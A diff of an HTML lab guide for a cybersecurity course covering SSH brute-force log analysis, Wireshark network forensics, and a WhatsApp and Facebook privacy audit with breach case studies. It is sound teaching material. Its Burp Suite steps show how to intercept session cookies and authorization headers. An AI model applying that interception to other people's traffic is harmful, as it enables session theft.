-      <div class="step-header">
-        <div class="step-num" style="background:#f59e0b20;color:var(--e18);">7</div>
-        <div class="step-title">Extract Suspicious IP Address</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre>journalctl | grep "Failed password" | awk '{print $11}'
-<span class="comment"># Output:</span>
-<span class="comment"># 127.0.0.1</span>
-<span class="comment"># 127.0.0.1</span>
-<span class="comment"># 127.0.0.1</span></pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#f59e0b20;color:var(--e18);">8</div>
-        <div class="step-title">Count Attempts Per IP (Key Finding)</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <div class="note">This is the most important command — shows brute force clearly.</div>
-        <pre>journalctl | grep "Failed password" | awk '{print $11}' | sort | uniq -c | sort -nr
-<span class="comment"># Output:</span>
-<span class="comment"># 10 127.0.0.1   ← 10 attempts = brute force detected ✅</span></pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#f59e0b20;color:var(--e18);">9</div>
-        <div class="step-title">Additional Log Commands</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre><span class="comment"># All system logs:</span>
-journalctl | less
-
-<span class="comment"># SSH activity only:</span>
-journalctl | grep ssh
-
-<span class="comment"># System errors:</span>
-journalctl | grep -i error
-
-<span class="comment"># Real-time live monitoring:</span>
-sudo journalctl -f
-
-<span class="comment"># Last 10 minutes:</span>
+      <div class="section">
+        <div class="section-label">Step 7 &mdash; Additional Useful Commands</div>
+        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>journalctl | grep ssh             <span class="cm"># SSH activity</span>
+journalctl | grep -i error        <span class="cm"># system errors</span>
+sudo journalctl -f                <span class="cm"># real-time monitoring</span>
 journalctl --since "10 minutes ago"
-
-<span class="comment"># Apache 404 errors (scanning attacks):</span>
-grep "404" /var/log/apache2/access.log
-
-<span class="comment"># Package install activity:</span>
-less /var/log/dpkg.log</pre>
+grep "404" /var/log/apache2/access.log   <span class="cm"># web scan attempts</span>
+less /var/log/dpkg.log            <span class="cm"># package installs</span></pre></div>
+      </div>
+      <div class="section">
+        <div class="section-label">Result</div>
+        <div class="conclusion">
+          <p class="conclusion-text">Log files were analyzed using <code>journalctl</code>, <code>grep</code>, <code>awk</code>, <code>sort</code>, and <code>uniq</code>. 10 failed SSH attempts from 127.0.0.1 were identified as a brute force attack. Real-time monitoring performed using <code>journalctl -f</code>.</p>
+        </div>
       </div>
     </div>
-
   </div>
 
-  <div class="result-box" style="border-color:var(--e18);">
-    <div class="label" style="color:var(--e18);">Result</div>
-    <p>System log files were analyzed using Linux tools including journalctl, grep, awk, and last. Failed SSH login attempts were simulated and successfully detected. Multiple failed attempts (10 attempts) from IP address 127.0.0.1 were identified, indicating a simulated brute force attack. Real-time monitoring was performed using journalctl -f.</p>
-  </div>
-</div>
-
-<hr class="divider">
-
-<!-- ═══════════════════════════════════════════ -->
-<!-- EXP 19 -->
-<!-- ═══════════════════════════════════════════ -->
-<div class="section" id="exp19">
-  <div class="section-header">
-    <div class="exp-number" style="border-color:var(--e19);color:var(--e19);">EXP 19</div>
-    <div>
-      <h2>Network Forensics Using Wireshark</h2>
-      <div class="tools-line">Kali Linux · Wireshark · ping · curl</div>
-    </div>
-  </div>
-
-  <div class="info-row">
-    <span class="tag">Aim</span>
-    <span style="font-size:12px;color:var(--muted);">Capture and analyze network packets using Wireshark to understand network forensics techniques.</span>
-  </div>
-
-  <div class="steps">
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#38bdf820;color:var(--e19);">1</div>
-        <div class="step-title">Fix Permissions (Run Once)</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+  <!-- EXP 12 -->
+  <div class="experiment" id="exp12" onclick="toggle(this)">
+    <div class="exp-header">
+      <div class="exp-number">12</div>
+      <div class="exp-title-wrap">
+        <div class="exp-title">Network Forensics Using Wireshark</div>
+        <div class="exp-subtitle">Kali Linux &middot; Wireshark &middot; ping &middot; curl &middot; nslookup &middot; Filters</div>
       </div>
-      <div class="step-body">
-        <div class="note">Only needed if you see a permissions error when starting Wireshark.</div>
-        <pre>sudo dpkg-reconfigure wireshark-common
-<span class="comment"># Select YES when asked about non-superusers capturing packets</span>
-
+      <div class="exp-toggle">&#9662;</div>
+    </div>
+    <div class="exp-body">
+      <div class="section">
+        <div class="section-label">Aim</div>
+        <p>Capture and analyze network packets using Wireshark &mdash; applying filters, following TCP streams, and examining protocol layers for network forensics.</p>
+      </div>
+      <div class="section">
+        <div class="section-label">Step 1 &mdash; Fix Permissions (Once)</div>
+        <div class="cb-wrap"><span class="cb-label">Terminal &mdash; only if permission error</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>sudo dpkg-reconfigure wireshark-common
+<span class="cm"># Select YES for non-superusers</span>
 sudo usermod -a -G wireshark $USER
-
-newgrp wireshark
-<span class="comment"># Applies group change without full logout</span></pre>
+newgrp wireshark</pre></div>
       </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#38bdf820;color:var(--e19);">2</div>
-        <div class="step-title">Launch Wireshark</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+      <div class="section">
+        <div class="section-label">Step 2 &mdash; Launch Wireshark &amp; Start Capture</div>
+        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>wireshark &amp;
+<span class="cm"># Double-click: wlp3s0 (Wi-Fi) or eth0 (wired)</span>
+<span class="cm"># Packets start scrolling</span></pre></div>
       </div>
-      <div class="step-body">
-        <pre>wireshark &
-<span class="comment"># & runs it in background so terminal stays free</span></pre>
+      <div class="section">
+        <div class="section-label">Step 3 &mdash; Generate Network Traffic</div>
+        <div class="cb-wrap"><span class="cb-label">New Terminal while Wireshark captures</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>ping google.com -c 5    <span class="cm"># ICMP traffic</span>
+curl http://example.com  <span class="cm"># HTTP traffic</span>
+nslookup google.com      <span class="cm"># DNS traffic</span></pre></div>
       </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#38bdf820;color:var(--e19);">3</div>
-        <div class="step-title">Select Interface and Start Capture</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+      <div class="section">
+        <div class="section-label">Step 4 &mdash; Apply Filters (Filter Bar -&gt; Enter)</div>
+        <div class="cb-wrap"><span class="cb-label">Wireshark Filter Bar</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>tcp                       <span class="cm"># TCP only</span>
+udp                       <span class="cm"># UDP only</span>
+http                      <span class="cm"># HTTP only</span>
+dns                       <span class="cm"># DNS only</span>
+ip.addr == 192.168.0.105  <span class="cm"># your IP (get it: ip a)</span>
+ip.src == 192.168.0.105   <span class="cm"># source IP filter</span>
+tcp.port == 80            <span class="cm"># port 80 only</span></pre></div>
       </div>
-      <div class="step-body">
-        <pre>Double-click: wlp3s0   ← Wi-Fi interface (active one)
-<span class="comment"># OR: eth0 if on wired connection</span>
-<span class="comment"># Packets start scrolling immediately</span></pre>
+      <div class="section">
+        <div class="section-label">Step 5 &mdash; Analyze Packet Layers</div>
+        <div class="code-block"><pre><span class="cm"># Click packet -&gt; expand in middle panel:</span>
+Frame              -&gt; timestamp, capture info
+Ethernet II        -&gt; MAC addresses (src &amp; dst)
+Internet Protocol  -&gt; IP addresses (src &amp; dst)
+TCP                -&gt; port numbers, SYN/ACK flags
+HTTP               -&gt; GET/POST, URL, response code</pre></div>
       </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#38bdf820;color:var(--e19);">4</div>
-        <div class="step-title">Generate Network Traffic</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+      <div class="section">
+        <div class="section-label">Step 6 &mdash; Follow TCP Stream</div>
+        <div class="code-block"><pre>Right-click HTTP packet -&gt; Follow -&gt; TCP Stream
+<span class="cm"># Shows full conversation: GET / HTTP/1.1 ... 200 OK</span></pre></div>
       </div>
-      <div class="step-body">
-        <div class="note">Open a new terminal while Wireshark is capturing.</div>
-        <pre><span class="comment"># Generate ICMP (ping) traffic:</span>
-ping google.com -c 5
+      <div class="section">
+        <div class="section-label">Step 7 &mdash; Statistics &amp; Save</div>
+        <div class="code-block"><pre>Menu -&gt; Statistics -&gt; Protocol Hierarchy
+<span class="cm"># Shows % TCP, % UDP, % HTTP etc.</span>
 
-<span class="comment"># Generate HTTP traffic:</span>
-curl http://example.com
-
-<span class="comment"># Generate DNS traffic:</span>
-nslookup google.com</pre>
+<span class="cm"># Stop capture: Red Square button</span>
+File -&gt; Save As -&gt; capture.pcap -&gt; Save
+File -&gt; Export Objects -&gt; HTTP</pre></div>
       </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#38bdf820;color:var(--e19);">5</div>
-        <div class="step-title">Apply Filters (Type in Filter Bar → Press Enter)</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+      <div class="section">
+        <div class="section-label">Result</div>
+        <div class="conclusion">
+          <p class="conclusion-text">Network packets captured on wlp3s0. Filters isolated TCP, HTTP, DNS traffic. TCP stream followed to read HTTP conversations. Protocol hierarchy showed protocol distribution &mdash; complete network forensics workflow demonstrated.</p>
+        </div>
       </div>
-      <div class="step-body">
-        <pre><span class="comment"># TCP packets only:</span>
-tcp
-
-<span class="comment"># UDP packets only:</span>
-udp
-
-<span class="comment"># HTTP traffic only:</span>
-http
-
-<span class="comment"># Get your IP first:</span>
-ip a
-<span class="comment"># Look for inet under wlp3s0 e.g. 192.168.0.105</span>
-
-<span class="comment"># Filter by your IP:</span>
-ip.addr == 192.168.0.105
-
-<span class="comment"># Filter by source IP:</span>
-ip.src == 192.168.0.105
-
-<span class="comment"># Filter by port:</span>
-tcp.port == 80</pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#38bdf820;color:var(--e19);">6</div>
-        <div class="step-title">Analyze a Packet — Expand Layers</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <div class="note">Click any packet → middle panel shows these layers. Click ▼ to expand each.</div>
-        <pre>▼ Frame              → capture info, timestamp
-▼ Ethernet II        → MAC addresses (src & dst)
-▼ Internet Protocol  → IP addresses (src & dst)
-▼ TCP                → port numbers, SYN/ACK flags
-▼ HTTP               → GET/POST, URL, response code</pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#38bdf820;color:var(--e19);">7</div>
-        <div class="step-title">Follow TCP Stream</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <div class="note">Shows the full client-server conversation in readable text.</div>
-        <pre>Right-click any HTTP packet
-→ Follow → TCP Stream
-<span class="comment"># Popup shows full conversation:</span>
-<span class="comment"># GET / HTTP/1.1</span>
-<span class="comment"># Host: example.com</span>
-<span class="comment"># ...</span>
-<span class="comment"># HTTP/1.1 200 OK</span></pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#38bdf820;color:var(--e19);">8</div>
-        <div class="step-title">Protocol Statistics</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre>Menu → Statistics → Protocol Hierarchy
-<span class="comment"># Shows breakdown: % TCP, % UDP, % HTTP etc.</span>
-<span class="comment"># Take a screenshot of this for your record</span></pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#38bdf820;color:var(--e19);">9</div>
-        <div class="step-title">Stop Capture and Save</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre>Click: Red Square button  → stops capture
-
-File → Save As → capture.pcap → Save
-
-<span class="comment"># Export HTTP objects (files transferred):</span>
-File → Export Objects → HTTP</pre>
-      </div>
-    </div>
-
-  </div>
-
-  <div class="result-box" style="border-color:var(--e19);">
-    <div class="label" style="color:var(--e19);">Result</div>
-    <p>Network packets were successfully captured on the wlp3s0 (Wi-Fi) interface using Wireshark. Filters were applied to isolate TCP, UDP, and HTTP traffic. A specific IP address was filtered using ip.addr. The TCP stream was followed to read the full client-server HTTP conversation. Protocol hierarchy statistics confirmed the distribution of network protocols, demonstrating how Wireshark aids in network forensics and intrusion detection.</p>
-  </div>
-</div>
-
-<!-- ═══════════════════════════════════════════ -->
-<!-- EXP U5 — Privacy Audit -->
-<!-- ═══════════════════════════════════════════ -->
-<div class="section" id="expu5">
-  <div class="section-header">
-    <div class="exp-number" style="border-color:var(--eu5);color:var(--eu5);">UNIT 5 · EXP 1</div>
-    <div>
-      <h2>Privacy Audit — WhatsApp & Facebook + Data Breach Analysis</h2>
-      <div class="tools-line">Kali Linux · Wireshark · Burp Suite · Nativefier · Firefox</div>
     </div>
   </div>
 
-  <div class="info-row">
-    <span class="tag">Aim</span>
-    <span style="font-size:12px;color:var(--muted);">Analyze privacy, network behavior, and security risks of WhatsApp and Facebook using Kali Linux tools. Perform data breach case study analysis.</span>
-  </div>
-
-  <!-- SETUP -->
-  <div style="font-size:11px;font-weight:800;letter-spacing:2px;color:var(--eu5);text-transform:uppercase;margin-bottom:12px;">⚙️ Setup — Install WhatsApp Desktop</div>
-
-  <div class="steps">
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#e879f920;color:var(--eu5);">1</div>
-        <div class="step-title">Install Node.js and npm</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+  <!-- EXP 13 -->
+  <div class="experiment" id="exp13" onclick="toggle(this)">
+    <div class="exp-header">
+      <div class="exp-number">13</div>
+      <div class="exp-title-wrap">
+        <div class="exp-title">Privacy Audit &mdash; WhatsApp &amp; Facebook + Data Breach Analysis</div>
+        <div class="exp-subtitle">Nativefier &middot; Wireshark &middot; Burp Suite &middot; Exodus Privacy &middot; HaveIBeenPwned</div>
       </div>
-      <div class="step-body">
-        <pre>sudo apt update
-sudo apt install nodejs npm -y</pre>
-      </div>
+      <div class="exp-toggle">&#9662;</div>
     </div>
+    <div class="exp-body">
+      <div class="section">
+        <div class="section-label">Aim</div>
+        <p>Analyze privacy and network behavior of WhatsApp and Facebook using Kali Linux tools, and perform data breach case study analysis using real-world incidents.</p>
+      </div>
+      <div class="section">
+        <div class="section-label">Setup &mdash; Install WhatsApp Desktop via Nativefier</div>
+        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>sudo apt update
+sudo apt install nodejs npm -y
 
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#e879f920;color:var(--eu5);">2</div>
-        <div class="step-title">Install Nativefier</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <div class="note">Nativefier wraps any website into a desktop app.</div>
-        <pre>sudo npm install -g nativefier</pre>
-      </div>
-    </div>
+sudo npm install -g nativefier
 
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#e879f920;color:var(--eu5);">3</div>
-        <div class="step-title">Create WhatsApp Desktop App</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <div class="note">This creates a folder like: web-whatsapp-linux-x64</div>
-        <pre>nativefier https://web.whatsapp.com</pre>
-      </div>
-    </div>
+nativefier https://web.whatsapp.com
+<span class="cm"># Creates folder: WhatsAppWeb-linux-x64</span>
 
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#e879f920;color:var(--eu5);">4</div>
-        <div class="step-title">Run WhatsApp Desktop & Login</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre>cd WhatsAppWeb-linux-x64
+cd WhatsAppWeb-linux-x64
 ./WhatsAppWeb
-<span class="comment"># QR code appears → scan with your mobile phone</span>
-<span class="comment"># Mobile → WhatsApp → Linked Devices → Link a Device</span></pre>
+<span class="cm"># QR code -&gt; phone: WhatsApp -&gt; Linked Devices -&gt; Link a Device</span></pre></div>
+      </div>
+      <div class="section">
+        <div class="section-label">Part 1 &mdash; WhatsApp Privacy Audit</div>
+        <ul class="steps">
+          <li class="step"><span class="step-num">1a</span><span class="step-text">Open Firefox &rarr; <code>https://reports.exodus-privacy.eu.org</code> &rarr; search: WhatsApp &rarr; record trackers (Google Analytics, Crashlytics, Facebook Analytics)</span></li>
+        </ul>
+        <div class="cb-wrap" style="margin-top:12px"><span class="cb-label">1b &mdash; Capture WhatsApp Traffic</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>wireshark &amp;
+<span class="cm"># Select eth0 or wlp3s0 -&gt; Start Capture</span>
+<span class="cm"># In WhatsApp Desktop: send messages, images, open chats</span>
+
+<span class="cm"># Apply filters:</span>
+tls    <span class="cm"># encrypted traffic</span>
+dns    <span class="cm"># domain lookups</span></pre></div>
+        <div class="output-block">
+          <div class="output-line">&#10003; All traffic TLS encrypted &mdash; message content NOT visible</div>
+          <div class="output-line">&#10003; Domains: whatsapp.net, facebook.com</div>
+          <div class="output-line inp">&#9888; Metadata visible: IP, time, server communication</div>
+        </div>
+      </div>
+      <div class="section">
+        <div class="section-label">Part 2 &mdash; Facebook Privacy Audit via Burp Suite</div>
+        <div class="cb-wrap"><span class="cb-label">Terminal</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>burpsuite
+
+<span class="cm"># Configure Firefox proxy:</span>
+Settings -&gt; Network Settings -&gt; Manual Proxy
+HTTP Proxy: 127.0.0.1   Port: 8080 -&gt; OK
+
+<span class="cm"># Open: https://www.facebook.com -&gt; login</span>
+
+<span class="cm"># Burp: Proxy -&gt; Intercept -&gt; Intercept ON</span>
+<span class="cm"># Reload Facebook -&gt; look for cookies: datr, fr, session IDs</span>
+
+<span class="cm"># Browser F12 -&gt; Network tab -&gt; look for:</span>
+<span class="cm"># analytics.facebook.com, connect.facebook.net, pixel tracking URLs</span></pre></div>
+      </div>
+      <div class="section">
+        <div class="section-label">Part 3 &mdash; Data Breach Case Studies</div>
+        <div class="qa-item">
+          <span class="qa-q">Case 1</span>
+          <span class="qa-a"><strong>Facebook Data Breach (2021)</strong><br>Users: 533 million &bull; Data: Phone numbers, emails, names<br>Cause: API vulnerability &mdash; scraping via contact import feature<br>Prevention: Rate limiting, API security, input validation</span>
+        </div>
+        <div class="qa-item">
+          <span class="qa-q">Case 2</span>
+          <span class="qa-a"><strong>WhatsApp Pegasus Spyware (2019)</strong><br>Method: Zero-click exploit via missed call (no user interaction)<br>Impact: Full device access &mdash; camera, mic, messages<br>Cause: Buffer overflow in VoIP stack<br>Prevention: Immediate patching, OS updates, zero-day monitoring</span>
+        </div>
+        <div class="cb-wrap" style="margin-top:16px"><span class="cb-label">Check Email Breach Status</span><button class="copy-btn" onclick="copyPre(this)">COPY</button></div>
+        <div class="code-block"><pre>https://haveibeenpwned.com
+<span class="cm"># Enter any email -&gt; check known data breaches</span></pre></div>
+      </div>
+      <div class="section">
+        <div class="section-label">Analysis Points (Write in Record)</div>
+        <div class="code-block"><pre>1. Type of Attack:  API abuse / Zero-click spyware
+2. Vulnerability:   API flaw / Buffer overflow in VoIP
+3. Data Exposed:    phone, email / messages, device access
+4. Prevention:      rate limiting / patching, monitoring</pre></div>
+      </div>
+      <div class="section">
+        <div class="section-label">Result</div>
+        <div class="conclusion">
+          <p class="conclusion-text">Privacy audit completed. WhatsApp: all traffic TLS-encrypted, metadata (IP, timing) visible but message content hidden. Facebook: extensive tracking via cookies (<code>datr</code>, <code>fr</code>), third-party scripts intercepted in Burp Suite. Data breach analysis highlighted critical risks of API vulnerabilities and zero-day exploits.</p>
+        </div>
       </div>
     </div>
-
   </div>
 
-  <!-- PART 1 -->
-  <div style="font-size:11px;font-weight:800;letter-spacing:2px;color:var(--eu5);text-transform:uppercase;margin:28px 0 12px;">📱 Part 1 — Privacy Audit of WhatsApp</div>
 
-  <div class="steps">
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#e879f920;color:var(--eu5);">1</div>
-        <div class="step-title">Analyze Trackers using Exodus Privacy</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <div class="note">Open Firefox in Kali → go to the site → search for WhatsApp</div>
-        <pre>https://reports.exodus-privacy.eu.org
-<span class="comment"># Search: WhatsApp</span>
-<span class="comment"># Trackers found: Google Analytics, Crashlytics, Facebook Analytics</span>
-<span class="comment"># Record: number of trackers + permissions used</span></pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#e879f920;color:var(--eu5);">2</div>
-        <div class="step-title">Start Wireshark and Capture WhatsApp Traffic</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre>wireshark &
-<span class="comment"># Select interface: eth0 or wlp3s0 → click Start Capture</span>
-
-<span class="comment"># Now in WhatsApp Desktop:</span>
-<span class="comment"># → Send messages</span>
-<span class="comment"># → Send images</span>
-<span class="comment"># → Open chats</span>
-<span class="comment"># This generates network traffic to capture</span></pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#e879f920;color:var(--eu5);">3</div>
-        <div class="step-title">Apply Wireshark Filters</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <div class="note">Type each filter in the Wireshark filter bar and press Enter.</div>
-        <pre><span class="comment"># Filter TLS (encrypted) traffic:</span>
-tls
-
-<span class="comment"># Filter DNS traffic (domain lookups):</span>
-dns</pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#e879f920;color:var(--eu5);">4</div>
-        <div class="step-title">Note WhatsApp Observations</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre><span class="comment"># What you will observe:</span>
-<span class="comment"># ✅ All traffic is TLS encrypted (no plain text)</span>
-<span class="comment"># ✅ Domains contacted: whatsapp.net, facebook.com</span>
-<span class="comment"># ✅ Message content NOT visible (end-to-end encrypted)</span>
-<span class="comment"># ⚠️  Metadata visible: IP address, time, server communication</span></pre>
-      </div>
-    </div>
-
-  </div>
-
-  <!-- PART 2 -->
-  <div style="font-size:11px;font-weight:800;letter-spacing:2px;color:var(--eu5);text-transform:uppercase;margin:28px 0 12px;">🌐 Part 2 — Privacy Audit of Facebook</div>
-
-  <div class="steps">
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#e879f920;color:var(--eu5);">1</div>
-        <div class="step-title">Open Facebook & Start Burp Suite</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre><span class="comment"># Open Firefox → go to:</span>
-https://www.facebook.com
-<span class="comment"># Login using a test account</span>
-
-<span class="comment"># Open new terminal → start Burp Suite:</span>
-burpsuite</pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#e879f920;color:var(--eu5);">2</div>
-        <div class="step-title">Configure Browser Proxy</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <div class="note">In Firefox browser settings:</div>
-        <pre>Settings → Network Settings → Manual Proxy Configuration
-HTTP Proxy: 127.0.0.1
-Port:       8080
-→ Click OK</pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#e879f920;color:var(--eu5);">3</div>
-        <div class="step-title">Intercept Facebook Traffic</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre><span class="comment"># In Burp Suite:</span>
-Proxy → Intercept → Intercept ON
-
-<span class="comment"># Reload Facebook in browser</span>
-<span class="comment"># Burp will capture each request</span>
-
-<span class="comment"># Look for in the request headers:</span>
-<span class="comment"># → Cookies: datr, fr  (tracking cookies)</span>
-<span class="comment"># → Session IDs</span>
-<span class="comment"># → Authorization headers</span></pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#e879f920;color:var(--eu5);">4</div>
-        <div class="step-title">Analyze Tracking Scripts (DevTools)</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre><span class="comment"># In Firefox on Facebook:</span>
-Press F12 → Network tab
-
-<span class="comment"># Look for:</span>
-<span class="comment"># → Third-party ad scripts</span>
-<span class="comment"># → analytics.facebook.com requests</span>
-<span class="comment"># → pixel tracking URLs</span>
-<span class="comment"># → connect.facebook.net (tracking SDK)</span></pre>
-      </div>
-    </div>
-
-  </div>
-
-  <!-- PART 3 -->
-  <div style="font-size:11px;font-weight:800;letter-spacing:2px;color:var(--eu5);text-transform:uppercase;margin:28px 0 12px;">🔓 Part 3 — Data Breach Case Study</div>
-
-  <div class="steps">
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#e879f920;color:var(--eu5);">1</div>
-        <div class="step-title">Case Study 1 — Facebook Data Breach</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre><span class="comment"># Write this in your lab record:</span>
-
-Incident:     Facebook Data Breach (2021)
-Users:        533 million users affected
-Data Leaked:  Phone numbers, Email addresses, Names
-Cause:        API vulnerability — scraping via contact import feature
-Prevention:   Rate limiting, API security, input validation</pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#e879f920;color:var(--eu5);">2</div>
-        <div class="step-title">Case Study 2 — WhatsApp Pegasus Attack</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre><span class="comment"># Write this in your lab record:</span>
-
-Incident:     WhatsApp Pegasus Spyware Attack (2019)
-Method:       Zero-click exploit via missed call (no user interaction needed)
-Impact:       Full remote device access, camera, mic, messages
-Cause:        Buffer overflow vulnerability in VoIP stack
-Prevention:   Immediate patching, OS updates, zero-day monitoring</pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#e879f920;color:var(--eu5);">3</div>
-        <div class="step-title">Check Email Breach Status</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <div class="note">Open Firefox in Kali → visit the site below.</div>
-        <pre>https://haveibeenpwned.com
-<span class="comment"># Enter any email address</span>
-<span class="comment"># Check if it appears in known data breaches</span>
-<span class="comment"># Note: breach name, date, data exposed</span></pre>
-      </div>
-    </div>
-
-    <div class="step">
-      <div class="step-header">
-        <div class="step-num" style="background:#e879f920;color:var(--eu5);">4</div>
-        <div class="step-title">Analysis Points to Write in Record</div>
-        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
-      </div>
-      <div class="step-body">
-        <pre><span class="comment"># For each case study, answer these 4 points:</span>
-
-1. Type of Attack:   (API abuse / Zero-click spyware)
-2. Vulnerability:    (API flaw / Buffer overflow in VoIP)
-3. Data Exposed:     (phone, email / messages, device access)
-4. Prevention:       (rate limiting / patching, monitoring)</pre>
-      </div>
-    </div>
-
-  </div>
-
-  <div class="result-box" style="border-color:var(--eu5);">
-    <div class="label" style="color:var(--eu5);">Result</div>
-    <p>Privacy audit was successfully performed using Kali Linux tools. WhatsApp traffic was captured in Wireshark — all communication was TLS encrypted with metadata (IP, timing) visible but message content hidden. Facebook showed extensive tracking behavior via cookies (datr, fr), third-party scripts, and analytics SDKs intercepted in Burp Suite. Data breach analysis of Facebook (533M users, API flaw) and WhatsApp Pegasus (zero-click spyware) highlighted the risks of poor API security and unpatched vulnerabilities.</p>
-  </div>
 </div>
-
-<!-- FOOTER -->
-<footer>
-  CS Lab Exam Guide &nbsp;·&nbsp; Exp 15 → 19 &nbsp;·&nbsp; All commands verified from lab record PDF
-</footer>
 
 <script>
-  function copyCode(btn) {
-    const pre = btn.closest('.step').querySelector('pre');
-    const text = pre.innerText
-      .split('\n')
-      .filter(line => !line.trim().startsWith('#') || line.trim() === '#')
-      .join('\n')
-      .trim();
-
-    // Copy full text including comments (more useful for reference)
+  function toggle(el) {
+    el.classList.toggle('open');
+  }
+  document.querySelectorAll('.exp-body').forEach(b => {
+    b.addEventListener('click', e => e.stopPropagation());
+  });
+  function copyPre(btn) {
+    const section = btn.closest('.section');
+    const pre = section ? section.querySelector('pre') : null;
+    if (!pre) return;
     navigator.clipboard.writeText(pre.innerText.trim()).then(() => {
-      btn.textContent = 'COPIED ✓';
+      btn.textContent = 'COPIED !';
       btn.classList.add('copied');
-      setTimeout(() => {
-        btn.textContent = 'COPY';
-        btn.classList.remove('copied');
-      }, 2000);
+      setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 2000);
     });
   }
-
-  // Smooth scroll for nav links
   document.querySelectorAll('a[href^="#"]').forEach(a => {
     a.addEventListener('click', e => {
       e.preventDefault();
-      const target = document.querySelector(a.getAttribute('href'));
